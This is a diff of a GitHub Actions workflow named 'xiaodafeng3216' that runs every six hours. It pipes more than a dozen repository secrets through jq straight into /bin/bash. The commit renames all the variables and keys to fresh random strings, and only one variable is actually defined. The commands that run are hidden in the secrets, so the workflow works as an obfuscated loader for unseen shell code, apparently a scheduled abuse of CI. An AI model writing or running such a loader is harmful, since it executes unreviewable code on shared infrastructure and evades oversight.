@@ -2,9 +2,8 @@ name: xiaodafeng3216
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
-
-jobs:  # 20139
+    - cron: '41 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,24 +11,19 @@ jobs:  # 20139
       - uses: actions/checkout@v4
       - name: xiaodafeng3216
         env:
-          ar45: ${{ secrets.ar45 }}
+          pz55260: ${{ secrets.pz55260 }}
         run: |
-          echo $ar45 | jq -r .k4441 | /bin/bash
-          echo $vsdsk04437 | jq -r .hfhg79 | /bin/bash
-          echo $t23964 | jq -r .oydcs3528 | /bin/bash
-          echo $u8603 | jq -r .uxq0294 | /bin/bash
-          echo $djxy17 | jq -r .bxxb8199 | /bin/bash
-          echo $hrtl3584 | jq -r .rqw18805 | /bin/bash
-          echo $pi81 | jq -r .ju4978 | /bin/bash
-          echo $cdsg15 | jq -r .prmt07 | /bin/bash
-          echo $bw6 | jq -r .o0 | /bin/bash
-          echo $dl1686 | jq -r .d054 | /bin/bash
-          echo $yxw07 | jq -r .iu39 | /bin/bash
-          echo $lxhyq79392 | jq -r .l0 | /bin/bash
-          echo $bfzcj7729 | jq -r .sgzaa8858 | /bin/bash
-          echo $f01148 | jq -r .b396 | /bin/bash
-          echo $acuzi9597 | jq -r .isqhy06 | /bin/bash
-          echo $mwuzc289 | jq -r .snt08 | /bin/bash
-          echo $o60 | jq -r .efl9 | /bin/bash
-          echo $un7 | jq -r .nsizd2839 | /bin/bash
+          echo $pz55260 | jq -r .vkvyv7 | /bin/bash
+          echo $s7759 | jq -r .yhx1477 | /bin/bash
+          echo $cgla5203 | jq -r .sk09 | /bin/bash
+          echo $uncsz0001 | jq -r .r9 | /bin/bash
+          echo $tfqpa2 | jq -r .ooyof0 | /bin/bash
+          echo $apvaq93 | jq -r .tu80651 | /bin/bash
+          echo $jzafz36 | jq -r .a3 | /bin/bash
+          echo $soo30258 | jq -r .qc7 | /bin/bash
+          echo $gbwkp994 | jq -r .f283 | /bin/bash
+          echo $ddmc7638 | jq -r .m27336 | /bin/bash
+          echo $umm539 | jq -r .ivahx1424 | /bin/bash
+          echo $bwmcu5 | jq -r .wxgs2484 | /bin/bash
+          echo $n57 | jq -r .pnwp6 | /bin/bash
 
